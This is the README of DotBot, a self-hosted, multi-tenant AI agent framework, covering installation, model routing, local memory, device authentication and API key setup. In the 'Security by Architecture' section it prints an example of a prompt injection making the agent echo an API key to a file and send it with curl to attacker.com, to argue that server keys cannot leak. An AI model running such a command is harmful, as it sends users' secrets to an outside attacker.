# DotBot

> Talk to it like a human. Your data stays on your machine. It remembers everything.

An AI assistant framework that understands how people actually communicate — weaving multiple tasks together, jumping between topics, circling back to earlier requests — and routes each piece to the right specialized worker with the right context. Built for businesses that need multi-tenant agent infrastructure with on-device execution and memory.

---

## Table of Contents

- [Getting Started](#getting-started)
- [What an AI Framework Should Be](#what-an-ai-framework-should-be)
- [Why DotBot? (vs. OpenClaw and Others)](#why-dotbot)
- [How It Works](#how-it-works)
- [Why This Architecture Matters](#why-this-architecture-matters)
  - [Real Data Ownership](#real-data-ownership)
  - [Security by Architecture](#security-by-architecture-not-prompts)
  - [Smart Multi-Provider Routing](#smart-multi-provider-routing)
  - [Memory That Actually Remembers](#memory-that-actually-remembers)
  - [Specialized Workers with Custom Knowledge](#specialized-workers-with-custom-knowledge)
  - [Councils for Quality Control](#councils-for-quality-control)
  - [Tools Built for Accuracy](#tools-built-for-accuracy)
  - [Multi-Tenant by Design](#multi-tenant-by-design)
- [Dev Mode](#dev-mode-local-development)
- [Updating](#updating)
- [Troubleshooting](#troubleshooting)
- [Authentication](#how-authentication-works)
- [Architecture](#architecture)
- [API Keys](#api-keys)
- [Documentation](#documentation)

---

## Getting Started

DotBot is a two-part system: a **cloud server** (handles AI reasoning) and a **local agent** (runs on each user's machine). Install the server first, then connect agents via invite links.

### Step 1 — Deploy the Server (Linux)

SSH into a Linux server (Ubuntu/Debian recommended) with a domain name pointed at it:

```bash
curl -fsSL https://raw.githubusercontent.com/Druidia-Bot/DotBot/main/install.sh -o /tmp/install.sh && sed -i 's/\r$//' /tmp/install.sh && bash /tmp/install.sh
```

The installer will:
1. Install Node.js, Caddy (automatic HTTPS), and build tools
2. Ask for your domain name
3. Ask for your API keys (at least one — [see checklist](#api-keys))
4. **Ask for ADMIN_API_KEY** — protects HTTP admin endpoints (required for production)
5. Build and start the server with auto-restarts
6. **Print an invite URL** — this is how you connect agents

**Minimum to start:** One LLM API key. DeepSeek is cheapest — [get one here](https://platform.deepseek.com/api_keys).

**Security:** The installer prompts for `ADMIN_API_KEY` to protect HTTP endpoints (`/api/scheduler`, `/api/memory`, etc.). Without this key, **anyone who can reach your server can access these endpoints**. Generate a random key:
```bash
openssl rand -hex 32
```
Or leave blank only for local dev (allows unauthenticated access — not safe for production).

### Step 2 — Get an Invite Link

The server installer prints an **invite URL** at the end:
```
https://your-server.com/invite/dbot-XXXX-XXXX-XXXX-XXXX
```

This is a **single-use link** that expires in 7 days. Open it in a browser to see a branded page with the install command, or share it directly with the person who needs to connect.

**Need more invite links?**
```bash
# On the server:
cd /opt/.bot && sudo -u dotbot node server/dist/generate-invite.js

# With options:
node server/dist/generate-invite.js --label "For Alice" --expiry-days 14 --max-uses 3
```

### Step 3 — Install the Agent (Windows)

Open the invite link in a browser. You'll see a page with a one-liner — copy it, paste it into **PowerShell as Administrator**, and press Enter:

```powershell
irm 'https://your-server.com/invite/dbot-XXXX-.../install' | iex
```

The installer handles everything: Git, Node.js, dependencies, configuration. Takes 2–5 minutes. The invite token is consumed on first connect — the link stops working after that.

> **Security Note:** The `irm | iex` pattern downloads and executes a script in one step. The installer mitigates TOCTOU risks by using random filenames and read-only flags when self-elevating. For extra security, you can download the script first, inspect it, then run it manually:
> ```powershell
> # Download and inspect first
> irm 'https://your-server.com/invite/dbot-XXXX-.../install' -OutFile install.ps1
> notepad install.ps1  # Review the script
> .\install.ps1        # Run after verification
> ```

**Alternative (manual):** If you have the server URL and token separately:
```powershell
irm https://raw.githubusercontent.com/Druidia-Bot/DotBot/main/install.ps1 | iex
```
Enter the server URL and invite token when prompted. (Same security note applies — you can download and inspect first if preferred.)

### Step 4 — Use It

Once installed, DotBot runs as a **background service** that starts automatically on login. You can also launch it manually:

- **Start Menu** — search "DotBot" to launch with a visible console
- **Browser** — open `client/index.html` from the install directory for the web UI
- **Discord** — ask DotBot: _"set up Discord"_ to connect your Discord server

**Managing DotBot on Windows:**
```powershell
# From the install directory (default: C:\Program Files\.bot):
.\run.ps1                # Start agent + server (dev) or agent-only (production)
.\run.ps1 -Stop          # Stop all DotBot processes
.\run.ps1 -Update        # Pull latest code + rebuild + restart
```

**Managing the Linux server:**
```bash
systemctl status dotbot                                       # Check status
systemctl restart dotbot                                      # Restart
journalctl -u dotbot -f                                       # Live logs
bash /opt/.bot/deploy/update.sh                               # Update server
cd /opt/.bot && sudo -u dotbot node server/dist/generate-invite.js  # New invite
```

---

## What an AI Framework Should Be

You should be able to say:

> "Can you refactor the authentication module to use JWT tokens? Oh and also remind me to call Mom at 6pm. Actually, for that auth refactor, make sure it's compatible with our existing session middleware."

And the system should **understand**:
- The first sentence → routes to senior-dev persona with codebase context
- The second sentence → routes to reminder tool with calendar access
- The third sentence → **reconnects to the first task**, adding a constraint to the ongoing refactor

This is how humans communicate. We don't open separate terminals for each task. We don't prefix every sentence with `[TASK_ID_2947]`. We weave thoughts together in a single conversation thread, and the listener understands what connects to what.

**DotBot does this.** It parses your natural communication, identifies the discrete tasks, spawns specialized agents for each, maintains isolated context, and lets you course-correct mid-flight — all from one conversation.

Say you're working on a project and mention three things in one breath:
- "Pull the latest database schema"
- "What's the weather tomorrow?"
- "Oh and for that schema, check if the user table needs an index"

Most AI tools either:
1. **Blend everything together** → database task gets polluted with weather data, confusion ensues
2. **Force you to separate** → "Please submit one request at a time"
3. **Drop the third part** → lost context because it's too far from the original request

DotBot **routes correctly**:
- Database task → spawns agent with DB tools, receives both the first and third input
- Weather query → separate quick lookup, returns immediately
- Context tracking → understands "that schema" refers to the database task, not the weather

This is **conversation threading at the architectural level**. Each task gets its own agent, workspace, and memory — but you interact through one natural conversation.

---

## Why DotBot?

As an **open-source agent framework**, DotBot is designed for flexibility and scale — not just single-user setups.

### Multi-Device Architecture

**DotBot:** Cloud server routes to **any connected device**, anywhere:
- **Browser** (web UI)
- **Multiple local agents** (desktop, laptop, work PC — all with their own memory)

**Why this matters:**
- ✅ **No network constraints** — devices don't need to be on the same LAN
- ✅ **Cross-device workflows** — initiate from Discord on your phone → executes on your PC at home
- ✅ **Zero pairing** — invite token auto-registers devices.
- ✅ **Server-orchestrated routing** — cloud server intelligently routes tasks to the right execution target
- ✅ **Multi-tenant by design** — one server supports multiple users, each with their own agent infrastructure

This is the architecture difference that makes DotBot a true **multi-tenant framework** rather than a single-user tool.

---

## How It Works

DotBot separates three things most AI systems conflate:

| What | Where | Why |
|------|-------|-----|
| **Intelligence** | Cloud server | Heavy models, smart routing, stateless processing |
| **Execution** | User's machine | File ops, shell commands, tool dispatch, local-only actions |
| **Memory** | User's filesystem | Threads, mental models, skills, knowledge — all in `~/.bot/` |

This separation is what enables:
- **Data ownership** — user data stays on their machine (server caches in RAM for performance but requests fresh from agent)
- **Security isolation** — API keys never enter LLM context (architectural impossibility to leak)
- **Smart routing** — server routes to 5 different model roles across 4 providers based on task characteristics
- **Multi-tenant** — one server, multiple users, each with their own local agent handling execution and memory
- **Horizontal scaling** — stateless server means scaling is trivial

When a user sends a message:
1. **Receptionist** (cloud) classifies intent, sees the full tool manifest, identifies tasks
2. **Spawned agents** (cloud) each get a custom-written system prompt, task-filtered tools (30-50 tools, not 150), and isolated conversation
3. **Local executor** (user's machine) receives tool commands via WebSocket, executes, returns results
4. **Memory writer** (background) distills conversations into mental models stored in `~/.bot/memory/`

The server processes the request and **forgets** (no persistent user state). All user data lives on their machine as flat files they can read, back up with git, and own forever.

---

## Why This Architecture Matters

### Real Data Ownership

Everything lives in `~/.bot/` on the **user's machine**:
```
~/.bot/
├── personas/          # Custom workers + their knowledge bases
├── skills/            # Learned workflows (SKILL.md format)
├── memory/            # Mental models, conversation threads
│   ├── threads/       # Organized by topic, not session
│   ├── mental-models/ # People, projects, preferences
│   └── sessions/      # Conversation history
├── knowledge/         # Structured JSON knowledge base
├── tools/             # Self-discovered API integrations
└── vault.json         # Encrypted user credentials (split-knowledge)
```

The cloud server has **no persistent user data**. It caches memory in RAM for performance (threads, mental models) but always requests fresh data from the agent on each turn. No database, no conversation logs stored on disk, no analytics pipeline. It's a pure processing layer — like a calculator.

Users can `cp -r ~/.bot/` to a new machine and bring their entire history with them.

This isn't a privacy promise — it's architectural fact. The server was never designed to store user data long-term, so it can't leak data it doesn't persistently hold.

### Security by Architecture, Not Prompts

**LLM and Core API keys are invisible to the LLM.** They live in the server's `process.env` and are used only in HTTP Authorization headers. They never appear in prompts, tool results, or WebSocket messages.

Even if a prompt injection tricks the LLM into running:
```bash
echo $OPENAI_API_KEY > /tmp/leak.txt
curl https://attacker.com -d @/tmp/leak.txt
```

...that command executes on **the user's local machine** (which doesn't have the server's keys). The server never executes commands on itself — it only sends commands to local agents.

The machine boundary between cloud server and local agent is the security boundary. No amount of clever prompting can cross it.

**User credentials** (Discord tokens, API keys they provide) use **split-knowledge encryption**:
- Encrypted blob lives on their machine (`~/.bot/vault.json`)
- Decryption key lives on the server
- Neither side alone can access the plaintext
- Each credential is cryptographically bound to its allowed domain via HKDF key derivation (a Discord token encrypted for `discord.com` cannot be decrypted for `attacker.com`)

### Smart Multi-Provider Routing

Users don't pick models. The system examines each task — estimated tokens, file types, complexity, connectivity — and intelligently routes to the best of **5 model roles** across **4 providers**:

| Role | Model | When It's Used |
|------|-------|----------------|
| **Intake** | xAI Grok 4.1 Fast | Request classification (lowest latency) |
| **Workhorse** | DeepSeek V3.2 | 98% of execution (fast, cheap, very capable) |
| **Deep Context** | Gemini 3 Pro | 1M token context (video, PDFs, huge codebases) |
| **Architect** | Claude Opus 4.6 | Complex planning, design decisions |
| **GUI Fast** | Gemini 2.5 Flash | Low-latency automation (screen reading, clicking) |
| **Local** | Qwen 2.5 0.5B | fast lightweight decision making |

If a provider is down, automatic fallback chains kick in. Users never configure temperature, manage token budgets, or manually switch models. Different tasks get different strengths automatically.

### Memory That Actually Remembers

Stateless AI assistants forget everything when you close the window. DotBot doesn't.

**Mental models** — structured knowledge about people, projects, places, preferences — persist forever and grow over time. The sleep cycle (background process) automatically distills raw conversations into lasting understanding.

**Threads** — conversation history organized by topic, not by session. When a user mentions "the authentication refactor" three days later, DotBot knows which thread to pull.

**Knowledge** — structured JSON documents with section-level retrieval. A marketing persona can have brand guidelines, a dev persona can have architecture docs. Skeleton-first retrieval (show keys, fetch sections on demand) keeps context windows lean.

**Skills** — learned workflows saved as `SKILL.md` files. DotBot can create, modify, and invoke skills across sessions.

Over time, the system knows who Billy is, what the user's tech stack is, and how they prefer their code formatted — without being told twice.

### Specialized Workers with Custom Knowledge

Different tasks need different thinking. Code review needs different expertise than writing a joke or debugging Docker.

DotBot routes to **personas** — each with its own system prompt, tool access, and model tier:
- **Receptionist** — classifies requests, routes to workers
- **Senior-dev** — complex code tasks, architecture decisions
- **Junior-dev** — straightforward implementation, following specs
- **Researcher** — web search, knowledge gathering, summarization
- **Writer** — documentation, emails, creative content
- **Sysadmin** — server operations, deployments, diagnostics

**Custom personas with specialized knowledge:**

Users can create personas with domain-specific expertise by adding **knowledge bases** to `~/.bot/personas/{slug}/knowledge/`. For example:

- **Marketing Strategist** persona with:
  - `brand-guidelines.json` — voice, tone, messaging pillars
  - `competitors.json` — competitive analysis and positioning
  - `campaigns.json` — historical campaign performance data

- **Project Manager** persona with:
  - `architecture-decisions.json` — ADRs and technical choices
  - `sprint-plans.json` — current roadmap and priorities
  - `team-structure.json` — org chart and stakeholder info

When a persona handles a task, its knowledge index is automatically injected into context. This enables deep domain expertise that persists across sessions and grows over time.

General knowledge in `~/.bot/knowledge/` is available to all personas. Persona-specific knowledge is scoped — only loaded when that persona is active. **Currently personas are auto selected** based on the task type, but this MIGHT be enhanced to allow manual selection in the future.

**Dynamic persona generation:**

The receptionist doesn't pick a static "sysadmin" prompt — it **writes** a custom system prompt per task: *"You're helping debug a PostgreSQL connection timeout. Here are the 8 relevant tools..."* Then spawns an agent with only those tools, an isolated conversation, and a persistent workspace.

This means:
- **Right tools, right task** — agents see 30-50 tools, not 150 (less confusion, fewer tokens)
- **Conversation isolation** — "plan day with kids" agent doesn't see "business proposal" context
- **Resumable work** — blocked tasks persist in `~/.bot/agent-workspaces/{id}/`, resumable anytime
- **Research delegation** — agents can spawn sub-agents for deep research

### Councils for Quality Control

**Councils** are optional review layers that polish output before it reaches the user. Each council is a panel of specialized reviewers (different personas, different models) that examine work from different angles.

Example council for code review:
```
~/.bot/councils/code-review/
├── council.json           # Council config
├── reviewers/
│   ├── security.json      # Security reviewer (checks for vulnerabilities)
│   ├── performance.json   # Performance reviewer (checks for bottlenecks)
│   └── style.json         # Style reviewer (checks formatting, conventions)
```

Each reviewer can:
- Use a different persona (security expert vs performance expert)
- Use a different model (Claude Opus for security, DeepSeek for style)
- Have its own knowledge base (OWASP Top 10 for security reviewer)

When enabled, councils act as a quality gate:
1. Worker completes task
2. Council reviews output (parallel or sequential)
3. Reviewers provide feedback
4. Chairman synthesizes reviews into actionable improvements
5. Worker revises or output proceeds

This enables **multi-model consensus** and **specialized expertise** beyond what a single worker can provide.

### Tools Built for Accuracy

**150+ specific tools** instead of a handful of general ones. `create_file(path, content)` is more reliable than `bash("echo '...' > file.txt")` because the LLM doesn't have to figure out shell escaping, quoting, redirect syntax, or platform differences.

The tradeoff is intentional: more tools = larger system prompt. But **accuracy and repeatability matter more than latency**. A tool that works every time is worth more than a fast one that works 70% of the time.

Tools are first-class:
- **Core tools** — built-in (filesystem, shell, http, browser, search)
- **Learned tools** — discovered at runtime (DotBot finds free APIs, tests them, saves to `~/.bot/tools/`)
- **Premium tools** — paid APIs accessed via server keys (ScrapingDog: 39 APIs including Google Search, Amazon, YouTube)
- **Skills** — reusable instruction sets (SKILL.md format, shared with Claude Code)

### Multi-Tenant by Design

DotBot is an **agent framework for businesses**, not a single-user app. One server can support **multiple users**, each with their own:
- Local agent (runs on their machine)
- Memory storage (`~/.bot/` on their machine)
- Device credentials (hardware-bound authentication)
- Isolated conversations and workspaces
- Custom personas and knowledge bases

The server orchestrates intelligence (LLM routing, persona selection, task decomposition) while each user's agent handles execution and owns their data.

This enables:
- **Team deployments** — one company server, each employee has their own agent
- **Enterprise scaling** — horizontal server scaling (stateless) + per-user on-device execution

Users connect via:
- **Browser client** — web UI served from `client/index.html`
- **Discord** — first-class integration (3 channels: conversation, updates, logs)
- **Multiple devices** — same user can connect from desktop, laptop, Discord simultaneously

The architecture separates **infrastructure** (cloud server) from **data** (user's machine), enabling privacy-preserving multi-tenant deployment.

---

## Dev Mode (Local Development)

If you're developing DotBot or want to run both server and agent on the same machine:

**Clone the repo:**
```bash
git clone https://github.com/Druidia-Bot/DotBot.git
cd DotBot
cp .env.example .env         # Edit .env and add your API keys
npm install
```

**Windows:**
```powershell
.\run.ps1                    # Starts server + agent + opens browser client
.\run.ps1 -Stop              # Stop everything
```

**Linux / macOS:**
```bash
bash run-dev.sh              # Starts server + agent
bash run-dev.sh --stop       # Stop everything
```

---

## Updating

### Updating the Agent (Windows PC)

**Option A — Ask DotBot to update itself:** Tell DotBot _"update yourself"_ via chat or Discord. The agent runs `git pull`, rebuilds, and restarts automatically.

**Option B — Manual update:**
```powershell
# From the install directory:
.\run.ps1 -Update        # Pulls latest code, installs deps, rebuilds, restarts
```

**Option C — Via the Start Menu:** The DotBot shortcut runs the launcher, which auto-restarts after updates. The agent's built-in update checker polls for new commits periodically.

> **Note:** The agent only installs dependencies for `shared/` and `local-agent/` — it will not attempt to build server components, even on a full monorepo clone.

### Updating the Server (Linux)

```bash
bash /opt/.bot/deploy/update.sh
```

This pulls the latest code, rebuilds, and restarts the systemd service. For manual control:
```bash
cd /opt/.bot
sudo -u dotbot git pull
sudo -u dotbot npm install -w shared -w server
sudo -u dotbot npm run build -w shared -w server
sudo systemctl restart dotbot
```

---

## Troubleshooting

### Connection Issues

**Agent can't connect to server:**
- **Check the server is running:** `systemctl status dotbot` on the server
- **Check the URL:** `~/.bot/.env` should have `DOTBOT_SERVER=wss://your-domain/ws` (note the `/ws` suffix for remote servers)
- **Check firewall:** Port 443 must be open on the server (Caddy handles HTTPS)
- **Check Caddy:** `systemctl status caddy` — Caddy reverse-proxies `/ws` to the internal WebSocket port

### Authentication Failed

**`fingerprint_mismatch`** — The hardware fingerprint changed since last connection. This can happen after:
- A code update that changed the fingerprint computation
- A Windows update or BIOS update
- Adding/removing hardware

The server now **accepts the new fingerprint automatically** and logs a warning. If the device was previously revoked (older server versions revoked on mismatch), an admin can un-revoke it:
```bash
# From an admin device, send the unrevoke_device admin action with the device ID
```
Or on the client: delete `~/.bot/device.json` and re-register with a new invite token.

**`device_revoked`** — The device was manually revoked by an admin. Get a new invite token and re-register:
```powershell
Remove-Item "$env:USERPROFILE\.bot\device.json"
# Set the new token in ~/.bot/.env as DOTBOT_INVITE_TOKEN=dbot-XXXX-...
# Then restart the agent
```

**`invalid_credentials`** — The device secret doesn't match. This usually means `~/.bot/device.json` was corrupted or copied from another machine. Delete it and re-register with a new invite token.

**`rate_limited`** — Too many failed auth attempts from this IP. Wait 15 minutes and try again.

### Update Failed on Client-Only PC

**Symptom:** `npm install` or `npm run build` fails with errors about `better-sqlite3` or server packages.

The update process only installs and builds `shared/` and `local-agent/`. If you see server build errors, you may be running an older version of the update tool. Pull the latest code manually:
```powershell
cd "C:\Program Files\.bot"
git pull
npm install -w shared -w local-agent
npm run build -w shared -w local-agent
```

### Agent Crashes on Startup

- **Check logs:** `Get-Content "$env:USERPROFILE\.bot\agent.log" -Tail 50`
- **Auto-rollback:** If the agent crashes within 10 seconds of an update, the launcher restores the previous build automatically
- **Manual rollback:** Copy `~/.bot/workspace/dist-backup/` back to `local-agent/dist/`
- **Nuclear option:** Delete the install directory, re-run the installer with a new invite token

### Discord Not Responding

- **Check connection:** Look for `[Discord] Bot online` in the agent console
- **Re-setup:** Tell DotBot _"set up Discord"_ — it walks you through the full configuration
- **Token expired:** Discord bot tokens don't expire, but if the bot was removed from the server, re-invite it

---

## How Authentication Works

DotBot uses **hardware-bound device credentials** — no passwords or API keys to manage:

1. **First connect** — agent presents invite token → server issues permanent device credentials (stored in `~/.bot/device.json`)
2. **Every connect** — agent sends credentials + a hardware fingerprint (motherboard serial, CPU ID, boot disk serial, Windows Machine GUID, BIOS serial)
3. **If the fingerprint changes** (code update, hardware swap, OS reinstall) — the server accepts the new fingerprint, logs a warning, and notifies admin devices. This is a monitoring signal, not a blocker.
4. **If someone copies credentials to another machine** — admin is alerted via the fingerprint change notification and can manually revoke the device
5. **Brute force protection** — 3 failed attempts in 15 minutes → IP blocked

### HTTP Admin Endpoints

The server also exposes HTTP REST API endpoints for admin operations (scheduler, memory queries, recurring tasks). These endpoints are **separate from the WebSocket chat** and use Bearer token authentication:

- **WebSocket connections** (browser, Discord, agents) → Device credentials
- **HTTP admin endpoints** → `ADMIN_API_KEY` in `.env`

**⚠️ Security Warning:** Without `ADMIN_API_KEY` configured, HTTP endpoints like `/api/scheduler/tasks`, `/api/memory/:userId`, and `/api/recurring/tasks` allow **unauthenticated access**. Anyone who can reach your server's IP/domain can:
- List and cancel scheduled tasks
- Query all user memory data
- Create/modify/delete recurring tasks

**For production self-hosting:** Set `ADMIN_API_KEY` in your server's `.env` file:
```bash
ADMIN_API_KEY=$(openssl rand -hex 32)
```

**For local dev:** Leaving it blank allows unauthenticated access (the server logs a warning).

External tools/scripts must include the key in requests:
```bash
curl -H "Authorization: Bearer YOUR_ADMIN_API_KEY" https://your-server.com/api/scheduler/stats
```

---

## Architecture

```
┌──────────────────────────────────────────────────┐
│                 User's Machine                   │
│                                                  │
│  ~/.bot/                                          │
│  ├── personas/     ← custom personas + knowledge  │
│  │   └── {slug}/knowledge/ ← per-persona KB       │
│  ├── knowledge/    ← general knowledge base       │
│  ├── councils/     ← review teams                 │
│  ├── skills/       ← SKILL.md instruction sets    │
│  ├── tools/        ← learned API integrations     │
│  └── memory/       ← threads, mental models       │
│                                                   │
│  ┌─────────────────────────────────────────────┐  │
│  │            DotBot Local Agent               │  │
│  │  • Executes tools (files, shell, http...)   │  │
│  │  • Manages ~/.bot/ storage                  │  │
│  │  • Bootstraps defaults on first run         │  │
│  │  • Owns all persistent state                │  │
│  └──────────────────┬──────────────────────────┘  │
└─────────────────────┼────────────────────────────┘
                      │ WebSocket (wss://)
┌─────────────────────▼────────────────────────────┐
│              DotBot Cloud Server                  │
│                   (Multi-Tenant)                  │
│                                                   │
│  Intake: receptionist → classify + route          │
│          planner → break down complex tasks       │
│          chairman → synthesize multi-worker       │
│          updater → write memory deltas            │
│                                                   │
│  Workers: senior-dev, junior-dev, writer,         │
│           researcher, code-reviewer, comedian,    │
│           sysadmin, data-analyst, general,         │
│           core-dev                                 │
│                                                   │
│  Councils: optional review layers                 │
│                                                   │
│  LLM: DeepSeek / Anthropic / OpenAI / Gemini     │
│                                                   │
│  State: ZERO persistent. RAM cache for perf.     │
└──────────────────────────────────────────────────┘
```

---

## API Keys

DotBot uses **6 model roles** that auto-select per task. You need API keys for the providers you want to use.

|     | Provider          | Model Role    | What It Does                                           | Required?                     |
| --- | ----------------- | ------------- | ------------------------------------------------------ | ----------------------------- |
| ☐   | **DeepSeek**      | Workhorse     | 98% of execution — chat, tool calls, writing           | **Yes** (recommended default) |
| ☐   | **xAI**           | Intake        | Request classification & routing (fast first response) | Recommended                   |
| ☐   | **Google Gemini** | Deep Context  | 1M token context — large files, video, PDFs            | Recommended                   |
| ☐   | **Anthropic**     | Architect     | Complex reasoning, planning, design decisions          | Recommended                   |
| ☐   | **OpenAI**        | Fallback      | Optional fallback if other providers are down          | Optional                      |
| ☐   | **ScrapingDog**   | Premium Tools | 39 APIs — Google Search, Amazon, YouTube, etc.         | Optional                      |

**Minimum to start**: One LLM key (DeepSeek is cheapest). The server will start with just one provider — missing providers are skipped, and the available ones handle all roles.

**Get your keys**:
- DeepSeek: https://platform.deepseek.com/api_keys
- xAI: https://console.x.ai/ (Grok API keys)
- Gemini: https://aistudio.google.com/apikey
- Anthropic: https://console.anthropic.com/settings/keys
- OpenAI: https://platform.openai.com/api-keys
- ScrapingDog: https://www.scrapingdog.com/ (premium web scraping, optional)

### Server .env (project root)

```bash
# --- LLM Providers (at least one required) ---
DEEPSEEK_API_KEY=                # Workhorse — 98% of execution (fast, cheap, very capable)
XAI_API_KEY=                     # Intake — fast request classification & routing
ANTHROPIC_API_KEY=               # Architect — complex reasoning, planning
GEMINI_API_KEY=                  # Deep Context — 1M tokens (video, PDFs, huge files)
# OPENAI_API_KEY=                # Optional fallback

# --- Premium Tools (optional) ---
# SCRAPING_DOG_API_KEY=          # ScrapingDog — 39 APIs (Google Search, Amazon, YouTube, etc.)

# --- Security (IMPORTANT for production) ---
ADMIN_API_KEY=                   # ⚠️ REQUIRED for production self-hosting
                                 # Protects HTTP admin endpoints (/api/scheduler, /api/memory, etc.)
                                 # Without this key, these endpoints are UNAUTHENTICATED
                                 # Generate: openssl rand -hex 32
                                 # Leave blank only for local dev (allows unauthenticated access)

# --- Advanced (usually leave defaults) ---
# DB_DIR=/home/dotbot/.bot/server-data   # SQLite database location
# LOG_DIR=/home/dotbot/.bot/server-logs  # Server log files
```

### Local Agent .env (~/.bot/.env)

```bash
# --- Connection (set automatically by installer) ---
DOTBOT_SERVER=wss://your-server.com/ws   # Server WebSocket URL
# DOTBOT_INVITE_TOKEN=                   # One-time token (consumed on first connect, auto-removed)

# --- Discord (optional) ---
# DISCORD_AUTHORIZED_USER_ID=            # Auto-captured on first message

# --- Advanced ---
# LOG_LEVEL=info                         # debug | info | warn | error
```

---

## Documentation

### Core

| Document                                         | Description                                                                                                                                           |
| ------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Guiding Principles](docs/GUIDING_PRINCIPLES.md) | Product philosophy — data ownership, security model, persona architecture, memory system, model selection, self-improvement, and design decisions     |
| [Coding Patterns](docs/CODING_PATTERNS.md)       | Engineering decisions — tool design, native function calling, separation of concerns, credential security, model selection, flat files over databases |
| [Deploy Checklist](deploy/DEPLOY-CHECKLIST.md)   | Full step-by-step server deployment guide                                                                                                             |

---

## License

Copyright 2025 Audience AI

Licensed under the [Sustainable Use License](LICENSE.md).

You can use, copy, modify, and redistribute this software for your own internal business purposes, personal use, or non-commercial purposes. You **cannot** offer it as a hosted/managed service to third parties. Self-hosting for your own use is always permitted.

See [LICENSE.md](LICENSE.md) for the complete terms.
